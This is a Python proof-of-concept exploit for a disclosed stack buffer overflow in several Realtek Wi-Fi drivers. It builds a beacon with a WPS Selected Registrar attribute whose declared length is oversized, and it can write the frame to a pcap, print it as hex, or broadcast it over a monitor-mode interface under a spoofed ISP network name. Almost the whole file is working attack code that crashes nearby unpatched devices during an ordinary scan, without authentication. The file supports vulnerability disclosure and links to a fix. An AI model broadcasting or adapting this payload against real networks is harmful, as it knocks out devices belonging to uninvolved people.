#!/usr/bin/env python3
"""
PoC: CVE-pending — Remote stack buffer overflow in rtl8723bs (and rtl8812au,
rtl8188eus, rtl8723du) via crafted WPS Selected Registrar attribute in a
beacon/probe-response.

Builds a valid 802.11 beacon frame whose WPS information element contains a
"Selected Registrar" attribute (type 0x1041) that claims data_len=200 instead
of the legitimate 1. The vulnerable driver copies attr_data_len bytes into a
1-byte stack variable (`u8 sr`) without any bound — a clean, controlled stack
buffer overflow triggered during a normal Wi-Fi scan.

THREE MODES:
  --pcap FILE     Write the crafted frame to a pcap file (default: safe,
                  no broadcast). Open in Wireshark to inspect the exact bytes.
  --inject IFACE  Broadcast the beacon over a monitor-mode interface. Requires
                  root and a card in monitor mode (e.g. `airmon-ng start wlan0`).
                  ** DO THIS ONLY IN A CONTROLLED LAB ENVIRONMENT. **
  --hex           Print the raw frame as a hex dump to stdout.

AFFECTED DRIVERS (confirmed by source review, same vulnerable code path):
  - drivers/staging/rtl8723bs  (in-tree, v7.3-rc1)
  - aircrack-ng/rtl8812au      (out-of-tree, widely used on Kali)
  - rtl8188eus                  (out-of-tree)
  - rtl8723du                   (out-of-tree)

TRIGGER PATH (no user interaction beyond having WiFi enabled):
  RX beacon/probe-resp → cfg80211 scan results → rtw_cfg80211_inform_bss() →
  rtw_get_wps_attr_content(wpsie, wpsielen, WPS_ATTR_SELECTED_REGISTRAR, &sr, NULL)
  where `sr` is a `u8` on the stack → memcpy(sr, attr_ptr+4, attr_data_len)
  with attacker-controlled attr_data_len up to 0xFFFF → stack overflow.

REPORTED:
  https://lore.kernel.org/all/20260901072249.366750-1-sha0@badchecksum.net/
  Fix (v2): https://lore.kernel.org/all/20260901091226.444666-1-sha0@badchecksum.net/

Found with mwemu (https://github.com/mwemuorg/mwemu) + source review.
"""

import argparse
import struct
import sys
import time

# ─── 802.11 Beacon frame constants ──────────────────────────────────────────

FRAME_CTRL_BEACON = 0x0080  # Type 0 (Management), Subtype 8 (Beacon)
BROADCAST = b"\xff\xff\xff\xff\xff\xff"
FAKE_BSSID = b"\x00\x13\x37\xde\xad\x01"  # Recognizable in captures
BEACON_INTERVAL = 100  # TU (102.4 ms)
CAPABILITY_ESS = 0x0001
CAPABILITY_PRIVACY = 0x0010

# ─── WPS IE construction ────────────────────────────────────────────────────

WLAN_EID_VENDOR_SPECIFIC = 0xDD
WPS_OUI = b"\x00\x50\xf2\x04"  # Microsoft WPS OUI type
WPS_ATTR_SELECTED_REGISTRAR = 0x1041


def build_wps_ie(overflow_len=200):
    """Build a WPS vendor-specific IE with a Selected Registrar attribute
    whose data_len is `overflow_len` instead of the legitimate 1.

    The vulnerable code path:
      u16 attr_data_len = RTW_GET_BE16(attr_ptr + 2);  // attacker: 200
      u16 attr_len = attr_data_len + 4;                 // 204
      memcpy(buf_content, attr_ptr + 4, attr_len - 4);  // copies 200 bytes
    into:
      u8 sr = 0;  // 1 byte on the stack

    The data after the attribute header is 'A' * overflow_len — on a real
    kernel this overwrites the stack frame, hits the canary, and panics
    (at minimum a remote, unauthenticated DoS).
    """
    # WPS attribute: [attr_id:2 BE][data_len:2 BE][data:data_len]
    attr = struct.pack(">HH", WPS_ATTR_SELECTED_REGISTRAR, overflow_len)
    attr += b"A" * overflow_len  # overflow payload (canary killer)

    ie_body = WPS_OUI + attr
    # Vendor-specific IE: [EID:1][Length:1][body]
    # Length field is 1 byte → max 255. For overflow_len <= ~245 this fits
    # in a single IE. For larger payloads the IE itself is malformed (length
    # field wraps), but the vulnerable parser reads wps_ielen from the IE
    # Length field and trusts attr_data_len independently — both paths
    # trigger the overflow.
    ie_len = len(ie_body)
    if ie_len > 255:
        # Truncate the IE length to 0xFF; the parser still reads the full
        # attr_data_len from inside the attribute and copies that many bytes.
        # This is how a real attacker would deliver a large payload.
        ie_len = 255
    ie = struct.pack("BB", WLAN_EID_VENDOR_SPECIFIC, ie_len) + ie_body
    return ie


def build_ssid_ie(ssid=b"EVIL_WPS_POC"):
    return struct.pack("BB", 0x00, len(ssid)) + ssid


def build_supported_rates_ie():
    rates = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
    return struct.pack("BB", 0x01, len(rates)) + rates


def build_ds_ie(channel=1):
    return struct.pack("BBB", 0x03, 1, channel)


def build_beacon(overflow_len=200, ssid=b"MOVISTAR_FIBRA", channel=1):
    """Build a complete 802.11 beacon frame with the malicious WPS IE."""

    # ── MAC header (24 bytes) ────────────────────────────────────────────
    fc = struct.pack("<H", FRAME_CTRL_BEACON)
    duration = struct.pack("<H", 0)
    addr1 = BROADCAST  # DA: broadcast
    addr2 = FAKE_BSSID  # SA: our fake AP
    addr3 = FAKE_BSSID  # BSSID
    seq_ctrl = struct.pack("<H", 0)
    mac_header = fc + duration + addr1 + addr2 + addr3 + seq_ctrl

    # ── Beacon body ──────────────────────────────────────────────────────
    timestamp = struct.pack("<Q", 0)
    interval = struct.pack("<H", BEACON_INTERVAL)
    capability = struct.pack("<H", CAPABILITY_ESS | CAPABILITY_PRIVACY)
    fixed = timestamp + interval + capability

    # ── Information Elements ─────────────────────────────────────────────
    ies = b""
    ies += build_ssid_ie(ssid)
    ies += build_supported_rates_ie()
    ies += build_ds_ie(channel)
    ies += build_wps_ie(overflow_len)

    return mac_header + fixed + ies


# ─── Output modes ───────────────────────────────────────────────────────────


def write_pcap(frame, path):
    """Write a single-frame pcap (LinkType 105 = IEEE 802.11)."""
    # Global header
    hdr = struct.pack(
        "<IHHIIII",
        0xA1B2C3D4,  # magic
        2,
        4,  # version 2.4
        0,  # thiszone
        0,  # sigfigs
        65535,  # snaplen
        105,  # LinkType: IEEE 802.11
    )
    # Packet record
    ts_sec = int(time.time())
    ts_usec = 0
    pkt = struct.pack("<IIII", ts_sec, ts_usec, len(frame), len(frame))
    pkt += frame

    with open(path, "wb") as f:
        f.write(hdr + pkt)
    print(f"[+] Wrote {len(frame)}-byte beacon to {path}")
    print(f"    Open with: wireshark {path}")


def hexdump(data, width=16):
    """Classic hex dump."""
    for i in range(0, len(data), width):
        chunk = data[i : i + width]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"  {i:04x}  {hex_part:<{width * 3}}  {ascii_part}")


def inject_frame(frame, iface, count=100, interval_ms=102):
    """Broadcast the beacon over a monitor-mode interface using scapy."""
    try:
        from scapy.all import sendp, RadioTap
    except ImportError:
        print("ERROR: scapy not installed (pacman -S python-scapy)", file=sys.stderr)
        sys.exit(1)

    # Wrap in RadioTap for injection
    pkt = RadioTap() / frame
    print(f"[+] Injecting {count} beacons on {iface} (interval {interval_ms}ms)...")
    print(f"    SSID: MOVISTAR_FIBRA | BSSID: {FAKE_BSSID.hex(':')}")
    print(f"    WPS Selected Registrar attr_data_len: 200 (legitimate: 1)")
    print(f"    Any rtl8723bs/rtl8812au/rtl8188eus device scanning nearby")
    print(f"    will overflow a 1-byte stack variable with 200 bytes.")
    print()
    sendp(pkt, iface=iface, count=count, inter=interval_ms / 1000.0, verbose=True)


# ─── Main ────────────────────────────────────────────────────────────────────


def main():
    p = argparse.ArgumentParser(
        description="PoC: rtl8723bs/rtl8812au WPS Selected Registrar stack overflow",
        epilog="Reported: https://lore.kernel.org/all/20260901072249.366750-1-sha0@badchecksum.net/",
    )
    p.add_argument("--pcap", metavar="FILE", help="Write crafted beacon to pcap file")
    p.add_argument(
        "--inject",
        metavar="IFACE",
        help="Broadcast via monitor-mode interface (NEEDS ROOT)",
    )
    p.add_argument("--hex", action="store_true", help="Print raw frame hex dump")
    p.add_argument(
        "--overflow-len",
        type=int,
        default=200,
        help="Bytes to overflow (default: 200, legitimate: 1)",
    )
    p.add_argument(
        "--count",
        type=int,
        default=100,
        help="Number of beacons to inject (default: 100)",
    )
    args = p.parse_args()

    if not args.pcap and not args.inject and not args.hex:
        args.pcap = "/tmp/rtl8723bs_wps_overflow.pcap"
        print(
            "[*] No mode specified, defaulting to --pcap /tmp/rtl8723bs_wps_overflow.pcap"
        )
        print()

    frame = build_beacon(overflow_len=args.overflow_len)

    print(f"[*] Crafted beacon: {len(frame)} bytes")
    print(f"    SSID: MOVISTAR_FIBRA")
    print(f"    BSSID: {FAKE_BSSID.hex(':')}")
    print(f"    WPS IE: Selected Registrar (0x1041) with data_len={args.overflow_len}")
    print(f"    Legitimate data_len for this attribute: 1")
    print(
        f"    Overflow: {args.overflow_len - 1} bytes past the u8 destination on the stack"
    )
    print()

    # Show the vulnerable code path
    print("[*] Vulnerable code path (same in all affected drivers):")
    print()
    print("    // rtw_ieee80211.c — rtw_get_wps_attr()")
    print("    u16 attr_data_len = RTW_GET_BE16(attr_ptr + 2);  // attacker: 200")
    print("    u16 attr_len = attr_data_len + 4;                 // 204")
    print()
    print("    // rtw_ieee80211.c — rtw_get_wps_attr_content()")
    print("    memcpy(buf_content, attr_ptr + 4, attr_len - 4);  // copies 200 bytes")
    print()
    print("    // ioctl_cfg80211.c — rtw_cfg80211_inform_bss() [scan path]")
    print("    u8 sr = 0;  // <-- 1-byte destination on the stack")
    print("    rtw_get_wps_attr_content(wpsie, wpsielen,")
    print("        WPS_ATTR_SELECTED_REGISTRAR, &sr, NULL);  // BOOM: 200 into 1")
    print()

    if args.hex:
        print("[*] Raw frame hex dump:")
        hexdump(frame)
        print()

    if args.pcap:
        write_pcap(frame, args.pcap)

    if args.inject:
        inject_frame(frame, args.inject, count=args.count)


if __name__ == "__main__":
    main()
